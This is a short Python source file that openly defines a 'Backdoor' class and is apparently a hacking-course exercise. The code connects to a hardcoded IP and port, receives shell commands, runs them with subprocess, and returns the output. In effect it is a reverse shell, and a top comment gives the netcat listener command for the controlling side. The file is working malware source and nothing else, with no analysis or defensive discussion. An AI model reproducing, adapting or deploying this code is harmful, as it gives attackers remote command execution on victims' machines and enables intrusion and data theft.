# nc -vv -l -p 4444

import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port, start=True):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        if start:
            self.run()

    def reliable_send(self, data):
        json_data = json.dumps(data)  # str
        json_data = json_data.encode()  # bytes
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                json_data += self.connection.recv(1024)  # bytes
                json_data_str = json.loads(json_data)  # str
                return json_data_str
            except ValueError:
                continue

    def execute_system_command(self, command):  # bytes -> bytes
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()  # bytes
            command_result = self.execute_system_command(command)  # bytes
            command_result = command_result.decode(errors='replace')  # str
            self.reliable_send(command_result)


Backdoor('10.0.2.13', 4444)
